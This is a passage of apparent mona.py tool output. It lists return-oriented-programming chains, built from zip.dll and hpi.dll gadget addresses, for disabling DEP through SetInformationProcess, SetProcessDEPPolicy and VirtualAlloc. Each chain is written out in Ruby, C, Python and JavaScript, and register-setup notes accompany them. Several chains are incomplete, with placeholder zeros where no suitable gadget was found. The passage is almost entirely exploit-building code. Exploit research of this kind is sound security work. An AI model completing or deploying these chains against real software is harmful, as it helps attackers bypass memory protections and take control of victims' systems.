                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d323400,  // POP ECX // RETN [zip.dll] 
                0x6d3280ac,  // &0x00000002 [zip.dll]
                0x6d324bb8,  // POP EBX // RETN [zip.dll] 
                0xffffffff,  // 0xffffffff-> ebx
                0x6d324c9b,  // POP EAX // RETN [zip.dll] 
                0x00000004,  // 0x00000004-> eax
                0x6d322062,  // POP EDI // POP ESI // POP EBP // RETN [zip.dll] 
                0x6d322062,  // skip 4 bytes [zip.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x00000000,  // [-] Unable to find pushad gadget
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into ebp
                0x00000000,  # [-] Unable to find ptr to &SetInformationProcess()
                0x00000000,  # [-] Unable to find a gadget to clear edx
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d323400,  # POP ECX # RETN [zip.dll] 
                0x6d3280ac,  # &0x00000002 [zip.dll]
                0x6d324bb8,  # POP EBX # RETN [zip.dll] 
                0xffffffff,  # 0xffffffff-> ebx
                0x6d324c9b,  # POP EAX # RETN [zip.dll] 
                0x00000004,  # 0x00000004-> eax
                0x6d322062,  # POP EDI # POP ESI # POP EBP # RETN [zip.dll] 
                0x6d322062,  # skip 4 bytes [zip.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x00000000,  # [-] Unable to find pushad gadget
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadgets to pickup the desired API pointer into ebp
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to &SetInformationProcess()
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find a gadget to clear edx
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2938%u6d32" + // 0x6d322938 : ,# INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u3400%u6d32" + // 0x6d323400 : ,# POP ECX # RETN [zip.dll] 
              "%u80ac%u6d32" + // 0x6d3280ac : ,# &0x00000002 [zip.dll]
              "%u4bb8%u6d32" + // 0x6d324bb8 : ,# POP EBX # RETN [zip.dll] 
              "%uffff%uffff" + // 0xffffffff : ,# 0xffffffff-> ebx
              "%u4c9b%u6d32" + // 0x6d324c9b : ,# POP EAX # RETN [zip.dll] 
              "%u0004%u0000" + // 0x00000004 : ,# 0x00000004-> eax
              "%u2062%u6d32" + // 0x6d322062 : ,# POP EDI # POP ESI # POP EBP # RETN [zip.dll] 
              "%u2062%u6d32" + // 0x6d322062 : ,# skip 4 bytes [zip.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for SetProcessDEPPolicy() :
          --------------------------------------------
           EAX = <not used>
           ECX = <not used>
           EDX = <not used>
           EBX = dwFlags (ptr to 0x00000000)
           ESP = ReturnTo (automatic)
           EBP = ptr to SetProcessDEPPolicy()
           ESI = <not used>
           EDI = ROP NOP (4 byte stackpivot)
          --------------------------------------------
          
          
          ROP Chain for SetProcessDEPPolicy() [(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)] :
          ---------------------------------------------------------------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x6d324dc3,  # POP EBX # RETN [zip.dll] 
                0x6d32c351,  # &0x00000000 [zip.dll]
                0x6d324dc1,  # POP EDI # POP ESI # POP EBX # RETN [zip.dll] 
                0x6d324dc1,  # skip 4 bytes [zip.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x00000000,  # [-] Unable to find pushad gadget
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x6d324dc3,  // POP EBX // RETN [zip.dll] 
                0x6d32c351,  // &0x00000000 [zip.dll]
                0x6d324dc1,  // POP EDI // POP ESI // POP EBX // RETN [zip.dll] 
                0x6d324dc1,  // skip 4 bytes [zip.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x00000000,  // [-] Unable to find pushad gadget
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x6d324dc3,  # POP EBX # RETN [zip.dll] 
                0x6d32c351,  # &0x00000000 [zip.dll]
                0x6d324dc1,  # POP EDI # POP ESI # POP EBX # RETN [zip.dll] 
                0x6d324dc1,  # skip 4 bytes [zip.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x00000000,  # [-] Unable to find pushad gadget
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
              "%u4dc3%u6d32" + // 0x6d324dc3 : ,# POP EBX # RETN [zip.dll] 
              "%uc351%u6d32" + // 0x6d32c351 : ,# &0x00000000 [zip.dll]
              "%u4dc1%u6d32" + // 0x6d324dc1 : ,# POP EDI # POP ESI # POP EBX # RETN [zip.dll] 
              "%u4dc1%u6d32" + // 0x6d324dc1 : ,# skip 4 bytes [zip.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for VirtualAlloc() :
          --------------------------------------------
           EAX = NOP (0x90909090)
           ECX = flProtect (0x40)
           EDX = flAllocationType (0x1000)
           EBX = dwSize
           ESP = lpAddress (automatic)
           EBP = ReturnTo (ptr to jmp esp)
           ESI = ptr to VirtualAlloc()
           EDI = ROP NOP (RETN)
           --- alternative chain ---
           EAX = ptr to &VirtualAlloc()
           ECX = flProtect (0x40)
           EDX = flAllocationType (0x1000)
           EBX = dwSize
           ESP = lpAddress (automatic)
           EBP = POP (skip 4 bytes)
           ESI = ptr to JMP [EAX]
           EDI = ROP NOP (RETN)
           + place ptr to "jmp esp" on stack, below PUSHAD
          --------------------------------------------
          
          
          ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
          --------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d1d408c,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x6d32217a,  # POP EBP # RETN [zip.dll] 
                0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
                0x6d32768f,  # POP EBX # RETN [zip.dll] 
                0x00000001,  # 0x00000001-> ebx
                0x00000000,  # [-] Unable to find gadget to put 00001000 into edx
                0x6d323400,  # POP ECX # RETN [zip.dll] 
                0x00000040,  # 0x00000040-> ecx
                0x6d327ab6,  # POP EDI # POP ESI # POP EBP # RETN [zip.dll] 
                0x6d324c9c,  # RETN (ROP NOP) [zip.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d324c9b,  # POP EAX # RETN [zip.dll] 
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d1d408c,  // ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x6d32217a,  // POP EBP // RETN [zip.dll] 
                0x00000000,  // &  [Unable to find ptr to 'JMP ESP']
                0x6d32768f,  // POP EBX // RETN [zip.dll] 
                0x00000001,  // 0x00000001-> ebx
                0x00000000,  // [-] Unable to find gadget to put 00001000 into edx
                0x6d323400,  // POP ECX // RETN [zip.dll] 
                0x00000040,  // 0x00000040-> ecx
                0x6d327ab6,  // POP EDI // POP ESI // POP EBP // RETN [zip.dll] 
                0x6d324c9c,  // RETN (ROP NOP) [zip.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d324c9b,  // POP EAX // RETN [zip.dll] 
                0x90909090,  // nop
                0x00000000,  // [-] Unable to find pushad gadget
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d1d408c,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x6d32217a,  # POP EBP # RETN [zip.dll] 
                0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
                0x6d32768f,  # POP EBX # RETN [zip.dll] 
                0x00000001,  # 0x00000001-> ebx
                0x00000000,  # [-] Unable to find gadget to put 00001000 into edx
                0x6d323400,  # POP ECX # RETN [zip.dll] 
                0x00000040,  # 0x00000040-> ecx
                0x6d327ab6,  # POP EDI # POP ESI # POP EBP # RETN [zip.dll] 
                0x6d324c9c,  # RETN (ROP NOP) [zip.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d324c9b,  # POP EAX # RETN [zip.dll] 
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
